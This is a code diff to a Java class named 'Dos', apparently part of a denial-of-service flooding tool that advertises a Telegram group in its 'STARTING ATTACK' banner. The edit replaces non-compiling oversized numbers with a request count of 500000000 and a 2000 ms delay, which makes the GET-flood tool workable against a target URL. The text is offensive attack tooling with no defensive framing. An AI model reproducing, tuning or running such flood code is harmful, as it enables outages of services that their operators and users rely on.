@@ -2237,7 +2237,7 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
         
-        Dos.amount = 50000000000000000000000000000000000000000000000000;     
+        Dos.amount = 500000000;     
         String option = "GET";
         int ioption = 1;
         if (option == "get" || option == "GET") {
@@ -2254,7 +2254,7 @@ public class Dos implements Runnable {
             }
         }
 
-        Thread.sleep(2000000000000000000000000000);
+        Thread.sleep(2000);
 
 
         System.out.println("\u001B[34m STARTING ATTACK - Our Telegram : t.me/OXiZ3N");
